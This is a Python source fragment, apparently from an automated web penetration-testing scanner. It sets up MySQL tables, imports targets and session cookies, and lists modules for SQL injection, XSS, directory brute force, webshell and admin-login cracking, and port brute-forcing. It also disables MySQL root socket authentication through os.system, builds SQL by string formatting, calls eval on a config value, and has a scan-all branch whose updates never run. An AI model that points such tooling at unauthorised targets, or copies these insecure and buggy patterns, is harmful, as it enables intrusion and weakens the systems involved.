    parsed=urlparse(start_url)
    netloc=parsed.netloc
    path=parsed.path

    if path!="":
        if "." in path.split("/")[-1]:
            path_part_value=path[:-(len(path.split("/")[-1])+1)].replace("/","_")
        elif path[-1]=="/":
            path_part_value=path[:-1].replace("/","_")
        else:
            path_part_value=path.replace("/","_")

    else:
        path_part_value=""
    netloc_part_value=netloc.replace(".","_").replace(":","_")
    return netloc_part_value+path_part_value+"_urls"

def database_init():
    # 本地数据库初始化,完成数据库配置和建立数据(数据库和targets+first_targets表),以及目标导入
    # 完成这一步后需要从数据库中按优先级取出没有完成的任务
    # eg.一个目标为http://www.freebuf.com,将它加入到targets表中,targets表中的sqli_scaned等各项标记扫描完成列代
    # 表该目标及其所有旁站对应项的扫描全部完成,在www_freebuf_com_pang表中也有http_domain为
    # http://www.freebuf.com的记录,该表中对应的sqli_scaned等各项标记代表目标
    # http://www.freebuf.com这一个网站的扫描完成情况

    global DB_SERVER
    global DB_USER
    global DB_PASS
    global DB_NAME
    global TARGETS_TABLE_NAME
    global FIRST_TARGETS_TABLE_NAME
    global SCAN_WAY
    sysInfo = get_string_from_command("uname -a")
    mysqlServiceInfo = get_string_from_command("service mysql status")
    if re.search(r"kali", sysInfo, re.I) and re.search(r"debian", sysInfo, re.I):
        if re.search(r"dead", mysqlServiceInfo, re.I):
            os.system("service mysql start")
            mysqlServiceInfo = get_string_from_command("service mysql status")
            if re.search(r"dead", mysqlServiceInfo, re.I):
                input(
                    "press any to exit your scan progress coz your mysql is not running,check your mysql service")
        # 下面是为了解决新版kali linux(2017.1)connect refused(无法修改root密码导致的)
        # 解决方法链接https://superuser.com/questions/949496/cant-reset-mysql-mariadb-root-password
        # 下面的双反斜杠在terminal中是不用双反斜杠的,但是在os.system中要多加一个反斜杠
        a = get_string_from_command(
            "echo select plugin from mysql.user where user=\\'root\\' | mysql")
        if re.search(r"unix_socket", a, re.I):
            # 下面的双反斜杠在terminal中是不用双反斜杠的,但是在os.system中要多加一个反斜杠
            os.system(
                "echo update mysql.user set plugin=\\'\\' where user=\\'root\\' | mysql")
            os.system("echo flush privileges | mysql")

    print("database init process,database and tables will be created here...")
    config_file_abs_path = CONFIG_INI_PATH
    with open(config_file_abs_path, 'r+') as f:
        content = f.read()
    if DB_SERVER=="":
        print("can not find DB_SERVER")
        while 1:
            print("please input your database server addr", end=' ')
            DB_SERVER = get_input_intime("127.0.0.1", 20)
            if check_string_is_ip(DB_SERVER) or check_string_is_domain(DB_SERVER):
                update_config_file_key_value(config_file_abs_path, 'default',
                                             'DB_SERVER', "'" + DB_SERVER + "'")
                break
            else:
                print(
                    "your input may not be a regular ip addr or a domain addr:(")
                continue
    print("DB_SERVER:" + DB_SERVER)

    if DB_USER=="":
        print("can not find DB_USER")
        print("please input your database username", end=' ')
        DB_USER = get_input_intime("root", 10)
        update_config_file_key_value(
            config_file_abs_path, 'default', 'DB_USER', "'" + DB_USER + "'")

    print("DB_USER:" + DB_USER)

    if DB_PASS=="":
        print("can not find DB_PASS")
        print("please input your database password", end=' ')
        DB_PASS = get_input_intime("root", 20)
        update_config_file_key_value(
            config_file_abs_path, 'default', 'DB_PASS', "'" + DB_PASS + "'")

    print("DB_PASS:" + DB_PASS)

    print("DB_NAME:" + DB_NAME)

    # 创建数据库DB_NAME和表TARGETS_TABLE_NAME,FIRST_TARGETS_TABLE_NAME,domain_pang
    sql0 = "create database %s" % DB_NAME
    if not exist_database(DB_NAME):
        execute_sql_in_db(sql0)
        execute_sql_in_db("ALTER DATABASE `%s` CHARACTER SET utf8" % DB_NAME)

    else:
        print("database exists,I will use the former database store tables")

    # 数据库中统一都用字符串形式存储各种数据


    # targets和first_targets表存放扫描是否完成信息和旁站列表和总的扫描结果
    # 这里的crawl_finished代表所有主要目标一个domain完成了爬虫
    #default_get_pang_value="0" if SCAN_WAY in [1,3] else "1"
    #default_get_sub_value="0" if SCAN_WAY in [2,3] else "1"
    sql1 = "create table `%s`(start_url varchar(200) not null primary key,http_domain  varchar(100) not null,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null,sqli_scaned varchar(50) not null default 1,\
xsss text not null,xss_scaned varchar(50) not null default 1,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
scan_finished varchar(50) not null default 0,\
get_pang_domains_finished varchar(50) not null default 1,\
get_sub_domains_finished varchar(50) not null default 1,\
pang_domains_crawl_scaned varchar(50) not null default 1,\
sub_domains_crawl_scaned varchar(50) not null default 1,\
pang_domains_cdn_scaned varchar(50) not null default 1,\
sub_domains_cdn_scaned varchar(50) not null default 1,\
pang_domains_risk_scaned varchar(50) not null default 1,\
sub_domains_risk_scaned varchar(50) not null default 1,\
pang_domains_script_type_scaned varchar(50) not null default 1,\
sub_domains_script_type_scaned varchar(50) not null default 1,\
pang_domains_dirb_scaned varchar(50) not null default 1,\
sub_domains_dirb_scaned varchar(50) not null default 1,\
pang_domains_sqli_scaned varchar(50) not null default 1,\
sub_domains_sqli_scaned varchar(50) not null default 1,\
pang_domains_xss_scaned varchar(50) not null default 1,\
sub_domains_xss_scaned varchar(50) not null default 1,\
pang_domains_cms_identify_scaned varchar(50) not null default 1,\
pang_domains_cms_scaned varchar(50) not null default 1,\
sub_domains_cms_identify_scaned varchar(50) not null default 1,\
sub_domains_cms_scaned varchar(50) not null default 1,\
pang_domains_crack_webshell_scaned varchar(50) not null default 1,\
sub_domains_crack_webshell_scaned varchar(50) not null default 1,\
pang_domains_crack_admin_page_scaned varchar(50) not null default 1,\
sub_domains_crack_admin_page_scaned varchar(50) not null default 1,\
pang_domains_port_scaned varchar(50) not null default 1,\
sub_domains_port_scaned varchar(50) not null default 1,\
pang_domains_portBruteCrack_scaned varchar(50) not null default 1,\
sub_domains_portBruteCrack_scaned varchar(50) not null default 1,\
pang_domains_whois_scaned varchar(50) not null default 1,\
sub_domains_whois_scaned varchar(50) not null default 1,\
pang_domains_scan_finished varchar(50) not null default 0,\
sub_domains_scan_finished varchar(50) not null default 0,\
final_scan_result mediumtext not null)" % TARGETS_TABLE_NAME

    sql2 = "create table `%s`(start_url varchar(200) not null primary key,http_domain  varchar(100) not null,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null,sqli_scaned varchar(50) not null default 1,\
xsss text not null,xss_scaned varchar(50) not null default 1,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
scan_finished varchar(50) not null default 0,\
get_pang_domains_finished varchar(50) not null default 1,\
get_sub_domains_finished varchar(50) not null default 1,\
pang_domains_crawl_scaned varchar(50) not null default 1,\
sub_domains_crawl_scaned varchar(50) not null default 1,\
pang_domains_risk_scaned varchar(50) not null default 1,\
sub_domains_risk_scaned varchar(50) not null default 1,\
pang_domains_cdn_scaned varchar(50) not null default 1,\
sub_domains_cdn_scaned varchar(50) not null default 1,\
pang_domains_script_type_scaned varchar(50) not null default 1,\
sub_domains_script_type_scaned varchar(50) not null default 1,\
pang_domains_dirb_scaned varchar(50) not null default 1,\
sub_domains_dirb_scaned varchar(50) not null default 1,\
pang_domains_sqli_scaned varchar(50) not null default 1,\
sub_domains_sqli_scaned varchar(50) not null default 1,\
pang_domains_xss_scaned varchar(50) not null default 1,\
sub_domains_xss_scaned varchar(50) not null default 1,\
pang_domains_cms_identify_scaned varchar(50) not null default 1,\
pang_domains_cms_scaned varchar(50) not null default 1,\
sub_domains_cms_identify_scaned varchar(50) not null default 1,\
sub_domains_cms_scaned varchar(50) not null default 1,\
pang_domains_crack_webshell_scaned varchar(50) not null default 1,\
sub_domains_crack_webshell_scaned varchar(50) not null default 1,\
pang_domains_crack_admin_page_scaned varchar(50) not null default 1,\
sub_domains_crack_admin_page_scaned varchar(50) not null default 1,\
pang_domains_port_scaned varchar(50) not null default 1,\
sub_domains_port_scaned varchar(50) not null default 1,\
pang_domains_portBruteCrack_scaned varchar(50) not null default 1,\
sub_domains_portBruteCrack_scaned varchar(50) not null default 1,\
pang_domains_whois_scaned varchar(50) not null default 1,\
sub_domains_whois_scaned varchar(50) not null default 1,\
pang_domains_scan_finished varchar(50) not null default 0,\
sub_domains_scan_finished varchar(50) not null default 0,\
final_scan_result mediumtext not null)" % FIRST_TARGETS_TABLE_NAME

    # print sql1
    if not exist_table_in_db(TARGETS_TABLE_NAME,DB_NAME): 
        execute_sql_in_db(sql1,DB_NAME) 
    else:
        print("TARGETS_TABLE_NAME exists,I will use the former one to store info")
    if not exist_table_in_db(FIRST_TARGETS_TABLE_NAME,DB_NAME):
        execute_sql_in_db(sql2,DB_NAME) 
    else:
        print("FIRST_TARGETS_TABLE_NAME exists,I will use the former one to store info")

    # 目标导入并根据选择的扫描模式创建目标旁站表或子站表
    print("input your targets now,make sure your targets are web app entries[eg.http://www.onlyhasdvwasite.com/dvwa/]...")
    print("input 'a|A' for adding your targets one by one\n\
input 'f|F' for adding your target by loading a target file\n\
input 'n|N' for adding no targets and use the exists targets in former db\n\
Attention! Make sure your input url is a cms entry,eg.'http://192.168.1.1/dvwa' or 'http://192.168.1.1/dvwa/'")
    choose = get_input_intime('n', 10)

    if choose == 'f' or choose == 'F':
        targets_file_abs_path=input("Please input your targets file\n:>")
        with open(targets_file_abs_path, "r+") as f:
            for start_url in f:
                start_url=re.sub(r"(\s)$","",start_url)
                target = get_http_domain_from_url(start_url)

                #import pdb
                #pdb.set_trace()

                print("你想要随便扫描还是认真的扫描,随便扫描不要求输入cookie,认真扫描要求输入用户登录后的cookie,输入y|Y选\
择随便扫描,n|N选择认真扫描,默认随便扫描,default[y]")
                tmpchoose = get_input_intime('y',2)
                if tmpchoose in ['n', 'N']:
                    cookie = input(
                        "please input your cookie for %s\n>" % start_url)
                else:
                    cookie = ""
                update_config_file_key_value(
                    config_file_abs_path, start_url, 'cookie', "'" + cookie + "'")

                # 保持session不失效
                if cookie!="":
                    keep_session_thread = MyThread(keep_session, (start_url, cookie))
                    keep_session_thread.start()

                print("已更新配置文件中的cookie,如果你之后想更新cookie,可直接在配置文件中修改")

                # 创建目标旁站表,比目标表少了pang_domains字段和sub_domains字段
                domain_value=target.split("/")[-1]
                domain_is_ip=False
                if re.match(r"(\d+\.){3}\d+",domain_value):
                    domain_is_ip=True
                pang_table_name = domain_value.replace(".", "_") + "_pang"
                # 创建目标子站表,比目标表少了pang_domains字段和sub_domains字段
                sub_table_name = domain_value.replace(".", "_") + "_sub"
                # 这里的crawl_scaned代表一个站(pang or sub)完成了爬虫

                sql_pang = "create table `%s`(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null, sqli_scaned varchar(50) not null default 1,\
xsss text not null, xss_scaned varchar(50) not null default 1,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % pang_table_name

                sql_sub = "create table `%s`(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null, sqli_scaned varchar(50) not null default 1,\
xsss text not null, xss_scaned varchar(50) not null default 1,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % sub_table_name

                # 这里改成无论何种扫描方式都建立sub表,因为爬虫模块会爬到子站,将爬到的子站放到sub表中对应字段中
                # 这里改成无论何种扫描方式都建立pang表,因为后面可能有对pang表的访问
                if SCAN_WAY in [1, 2, 3, 4]:
                    if not domain_is_ip:
                        #如果domain是ip的格式则不建domain_pang和domain_sub表
                        execute_sql_in_db(sql_pang,DB_NAME)
                        execute_sql_in_db(sql_sub,DB_NAME)
                    else:
                        #domain是ip格式
                        if SCAN_WAY in [1,2,3] :
                            input("If the domain is ip format and SCAN_WAY is not 4,I will skip this target.Press any key to continue")
                            continue
                else:
                    print("SCAN_WAY setup error,not in 1-4")

                # 创建目标urls表.eg:www_baidu_com_urls
                target_urls_table_name = get_start_url_urls_table(start_url)
                sql = "create table `%s`(url varchar(250) not null primary key,code varchar(10) not null,\
title varchar(100) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % target_urls_table_name
                execute_sql_in_db(sql,DB_NAME) 

        os.system(
            '''echo targets_file='"'%s'"' >> targets.py''' %
            targets_file_abs_path)
        print(
            "do you want to add it to the first targets table with higher priority to scan? y|n\
default[n]")
        choose = get_input_intime('n', 10)
        if choose == 'y' or choose == 'Y':
            with open(targets_file_abs_path, "r+") as f:
                for start_url in f:
                    start_url = re.sub(r"(\s)$", "", start_url)
                    target = get_http_domain_from_url(start_url)
                    sql3 = "insert into `%s`(start_url,http_domain,domain) values('%s','%s','%s')" % (
                        FIRST_TARGETS_TABLE_NAME,start_url, target, target.split("/")[-1])
                    execute_sql_in_db(sql3,DB_NAME)
        else:
            with open(targets_file_abs_path, "r+") as f:
                for start_url in f:
                    start_url = re.sub(r"(\s)$", "", start_url)
                    target = get_http_domain_from_url(start_url)
                    sql3 = "insert into `%s`(start_url,http_domain,domain) values('%s','%s','%s')" % (
                        TARGETS_TABLE_NAME,start_url, target, target.split('/')[-1])
                    execute_sql_in_db(sql3,DB_NAME) 

    elif choose == 'a' or choose == 'A':
        while 1:
            print(
                "please input your targets,eg.https://www.baidu.com,'d|D' for done,default[d]")
            start_url=input()
            if len(start_url) == 0:
                start_url= 'd'
            if start_url!= 'd' and start_url!= 'D' and re.match(
                    r"http.*", start_url):
                print(
                    "do you want to add it to the first targets table with higher priority to scan? y|n\
default[n]")
                choose = get_input_intime('n', 10)
                target=get_http_domain_from_url(start_url)
                print("你想要随便扫描还是认真的扫描,随便扫描不要求输入cookie,认真扫描要求输入用户登录后的cookie,输入y|Y选\
择随便扫描,n|N选择认真扫描,默认随便扫描,default[y]")
                tmpchoose = get_input_intime('y')
                if tmpchoose in ['n', 'N']:
                    cookie = input(
                        "please input your cookie for %s\n>" % start_url)
                else:
                    cookie = ""
                update_config_file_key_value(
                    config_file_abs_path, start_url, 'cookie', "'" + cookie + "'")

                # 保持session不失效
                if cookie!="":
                    keep_session_thread = MyThread(keep_session, (target, cookie))
                    keep_session_thread.start()

                print("已更新配置文件中的cookie,如果你之后想更新cookie,可直接在配置文件中修改")

                # 创建目标旁站表,比目标表少了pang_domains字段和sub_domains字段
                domain_value=target.split('/')[-1]
                domain_is_ip=False
                if re.match(r"(\d+\.){3}\d+",domain_value):
                    domain_is_ip=True
                pang_table_name = domain_value.replace(".", "_") + "_pang"
                # 创建目标子站表,比目标表少了pang_domains字段和sub_domains字段
                sub_table_name = domain_value.replace(".", "_") + "_sub"
                # 这里的crawl_scaned代表一个站(pang or sub)完成了爬虫
                sql_pang = "create table `%s`(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null,sqli_scaned varchar(50) not null default 1,\
xsss text not null,xss_scaned varchar(50) not null default 1,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null,like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
robots_and_sitemap text not null,scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % pang_table_name

                sql_sub = "create table `%s`(http_domain  varchar(100) not null primary key,domain varchar(50) not null,\
you_can_take_notes_in_this_column_for_your_own_pentest text not null comment '人工渗透时笔记列' default '',\
actual_ip_from_cdn_scan varchar(50) not null,\
cdn_scaned varchar(50) not null default 1,\
port_scan_info text not null,port_scaned varchar(50) not null default 1,\
risk_scan_info mediumtext not null,\
risk_scaned varchar(50) not null default 1,\
script_type varchar(50) not null,\
script_type_scaned varchar(50) not null default 1,\
dirb_info mediumtext not null,dirb_scaned varchar(50) not null default 1,\
sqlis text not null, sqli_scaned varchar(50) not null default 1,\
xsss text not null, xss_scaned varchar(50) not null default 1,\
crawl_scaned varchar(50) not null default 1,\
cms_value text not null,cms_identify_scaned varchar(50) not null default 1,cms_scan_info text not null,cms_scaned varchar(50) not null default 1,\
like_admin_login_urls text not null,\
cracked_admin_login_urls_info text not null, like_webshell_urls text not null,\
cracked_webshell_urls_info text not null,\
crack_webshell_scaned varchar(50) not null default 1,\
crack_admin_page_scaned varchar(50) not null default 1,\
portBruteCrack_info text not null,portBruteCrack_scaned varchar(50) not null default 1,\
whois_info text not null,whois_scaned varchar(50) not null default 1,\
resource_files text not null,\
robots_and_sitemap text not null, scan_result mediumtext not null,\
scan_finished varchar(50) not null default 0)" % sub_table_name

                # 这里改成无论何种扫描方式都建立sub表,因为爬虫模块会爬到子站,将爬到的子站放到sub表中对应字段中
                # 这里改成无论何种扫描方式都建立pang表,因为后面可能有对pang表的访问
                SCAN_WAY=eval(get_key_value_from_config_file(CONFIG_INI_PATH, 'default', 'scan_way'))
                if SCAN_WAY in [1, 2, 3, 4]:
                    if not domain_is_ip:
                        execute_sql_in_db(sql_pang,DB_NAME)
                        execute_sql_in_db(sql_sub,DB_NAME)
                    else:
                        #domain是ip格式
                        if SCAN_WAY in [1,2,3] :
                            input("If the domain is ip format and SCAN_WAY is not 4,I will skip this target.Press any key to continue")
                            continue

                else:
                    print("SCAN_WAY setup error,not in 1-4")

                # 创建目标urls表.eg:www_baidu_com_urls
                target_urls_table_name = get_start_url_urls_table(start_url)
                sql = "create table `%s`(url varchar(250) not null primary key,code varchar(10) not null,\
title varchar(100) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % target_urls_table_name
                execute_sql_in_db(sql,DB_NAME)

                if choose == 'y' or choose == 'Y':
                    sql3 = "insert into `%s`(start_url,http_domain,domain) values('%s','%s','%s') " % (
                        FIRST_TARGETS_TABLE_NAME,start_url, target, target.split("/")[-1])
                    execute_sql_in_db(sql3,DB_NAME) 
                    set_scan_finished("pang_domains_sqli_scaned",DB_NAME,FIRST_TARGETS_TABLE_NAME,"start_url", start_url)
                    set_scan_finished("sub_domains_sqli_scaned",DB_NAME,FIRST_TARGETS_TABLE_NAME,"start_url", start_url)

                else:
                    sql3 = "insert into `%s`(start_url,http_domain,domain) values('%s','%s','%s')" % (
                        TARGETS_TABLE_NAME,start_url, target, target.split('/')[-1])
                    execute_sql_in_db(sql3,DB_NAME) 
                    set_scan_finished("pang_domains_sqli_scaned",DB_NAME,TARGETS_TABLE_NAME,"start_url", start_url)
                    set_scan_finished("sub_domains_sqli_scaned",DB_NAME,TARGETS_TABLE_NAME,"start_url", start_url)

                continue
            elif start_url!= 'd' and start_url!= 'D' and re.match(r"http.*", start_url,re.I) is None:
                print("please input http(s)://... or d or D")
                continue
            else:
                break


    else:
        print("I will use the exisit targets in the db for scan job")
        pass


    print('''There are below 15 kinds of scan module:
1.cdn scan(check and find out actual ip behind cdn,it's a base for 2)
2.pang domains scan(get the pang domains of the targets,is based on 1)
3.sub domains scan(get the sub domains of the targets)
4.crawl scan(crawl the target,it's a base for 8 and 12 and 13,it's a base for 6)
5.port scan(scan the targets' port,it's a base for 6 and 14)
6.high rish scan(check if the targets has high risk vul,is based on 4 and 5)
7.sqli scan(check if the targets has sql injection vul)
8.xss scan(check if the targets has xss vul,is based on 4)
9.script type scan(try to find out the targets' script type[php,asp,aspx,jsp])
10.dirb scan(brute force scan the targets' dirs and files,it's a base for 12 and 13)
11.cms scan(findout the targets' cms type[joomla,wordpress,ecshop,...])
12.crack webshell scan(try to find the exists webshell on targets site and try to crack it,is based on 4 and 10)
13.crack admin page scan(try to find the targets' admin login page and try to crack it,is based on 4 and 10)
14.port brute crack scan(try to brute force crack the common open port,is based on 5)
15.whois scan(get the targets' whois info)''')

    print(
        '''Do you want my choosing to scan all of them by default,if you have special needs(eg.scan sqli vuls alone,etc) please input n|N , default[y]''')
    choose_scan_strategy = get_input_intime('y')
    # print("\n")
    if choose_scan_strategy == 'Y' or choose_scan_strategy == 'y':
        set_column_name_scan_module_unfinished("cdn_scaned",SCAN_WAY)
        sqlList=[]
        tmpSql="update %s set get_pang_domains_finished='0'" % FIRST_TARGETS_TABLE_NAME
        tmpSql="update %s set get_pang_domains_finished='0'" % TARGETS_TABLE_NAME
        for each in sqlList:
            execute_sql_in_db(each,DB_NAME) 
        sqlList=[]
        tmpSql="update %s set get_sub_domains_finished='0'" % FIRST_TARGETS_TABLE_NAME
        tmpSql="update %s set get_sub_domains_finished='0'" % TARGETS_TABLE_NAME
        for each in sqlList:
            execute_sql_in_db(each,DB_NAME) 
        set_column_name_scan_module_unfinished("crawl_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("port_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("risk_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("sqli_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("xss_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("script_type_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("dirb_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("cms_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("crack_webshell_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("crack_admin_page_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("portBruteCrack_scaned",SCAN_WAY)
        set_column_name_scan_module_unfinished("whois_scaned",SCAN_WAY)

    else:
        while True:
            print('''Please input your selections on upon 15 scan modules,use blank to separate them.
eg:
1 2
4 8
4 10 12
4 10 13
5 14
4 5 6
5
Attention:
a.if you have choosed 2,then you must have choosed 1
b.if you have choosed 8,then you must have choosed 4
c.if you have choosed 12,then you must have choosed 4 and 10
d.if you have choosed 13,then you must have choosed 4 and 10
e.if you have choosed 14,then you must have choosed 5
f.if you have choosed 6,then you must have choosed 4 and 5''')
            shouldContinue = 0
            selections = input("your choose:")
            selectionsList = re.split("\s+", selections)
            if '2' in selectionsList and ('1' not in selectionsList):
                print("if you have choosed 2,then you must have choosed 1")
                shouldContinue = 1
            if '8' in selectionsList and ('4' not in selectionsList):
                print("if you have choosed 8,then you must have choosed 4")
                shouldContinue = 1
            if '12' in selectionsList and ('4' not in selectionsList or '10' not in selectionsList):
                print("if you have choosed 12,then you must have choosed 4 and 10")
                shouldContinue = 1
            if '13' in selectionsList and ('4' not in selectionsList or '10' not in selectionsList):
                print("if you have choosed 13,then you must have choosed 4 and 10")
                shouldContinue = 1
            if '14' in selectionsList and ('5' not in selectionsList):
                print("if you have choosed 14,then you must have choosed 5")
                shouldContinue = 1
            if '6' in selectionsList and ('4' not in selectionsList or '5' not in selectionsList):
                print("if you have choosed 6,then you must have choosed 4 and 5")
                shouldContinue = 1

            if shouldContinue == 1:
                continue
            break
        if '1' in selectionsList:
            set_column_name_scan_module_unfinished("cdn_scaned",SCAN_WAY)

        if '2' in selectionsList or SCAN_WAY in [1,3]:
            tmpSql="update %s set get_pang_domains_finished='0'" % FIRST_TARGETS_TABLE_NAME
            execute_sql_in_db(tmpSql,DB_NAME) 
            tmpSql="update %s set get_pang_domains_finished='0'" % TARGETS_TABLE_NAME
            execute_sql_in_db(tmpSql,DB_NAME) 

        if '3' in selectionsList or SCAN_WAY in [2,3]:
            tmpSql="update %s set get_sub_domains_finished='0'" % FIRST_TARGETS_TABLE_NAME
            execute_sql_in_db(tmpSql,DB_NAME) 
            tmpSql="update %s set get_sub_domains_finished='0'" % TARGETS_TABLE_NAME
            execute_sql_in_db(tmpSql,DB_NAME) 

        if '4' in selectionsList:
            set_column_name_scan_module_unfinished("crawl_scaned",SCAN_WAY)

        if '5' in selectionsList:
            set_column_name_scan_module_unfinished("port_scaned",SCAN_WAY)

        if '6' in selectionsList:
            set_column_name_scan_module_unfinished("risk_scaned",SCAN_WAY)

        if '7' in selectionsList:
            set_column_name_scan_module_unfinished("sqli_scaned",SCAN_WAY)
        if '8' in selectionsList:
            set_column_name_scan_module_unfinished("xss_scaned",SCAN_WAY)
        if '9' in selectionsList:
            set_column_name_scan_module_unfinished("script_type_scaned",SCAN_WAY)
        if '10' in selectionsList:
            set_column_name_scan_module_unfinished("dirb_scaned",SCAN_WAY)
        if '11' in selectionsList:
            set_column_name_scan_module_unfinished("cms_scaned",SCAN_WAY)
        if '12' in selectionsList:
            set_column_name_scan_module_unfinished("crack_webshell_scaned",SCAN_WAY)
        if '13' in selectionsList:
            set_column_name_scan_module_unfinished("crack_admin_page_scaned",SCAN_WAY)
        if '14' in selectionsList:
            set_column_name_scan_module_unfinished("portBruteCrack_scaned",SCAN_WAY)
        if '15' in selectionsList:
            set_column_name_scan_module_unfinished("whois_scaned",SCAN_WAY)





def get_value_from_url(url):
    # 返回一个字典{'y1':y1,'y2':y2}
    # eg.从http://www.baidu.com/12/2/3.php?a=1&b=2中得到
    #'y1':"http://www.baidu.com/12/2/3.php"
    #'y2':"http://www.baidu.com/12/2"
    import urllib.parse
    import re
    url = re.sub(r'\s$', '', url)
    if get_http_domain_from_url(url) in [url, url + "/"]:
        # 如果url就是http_domain
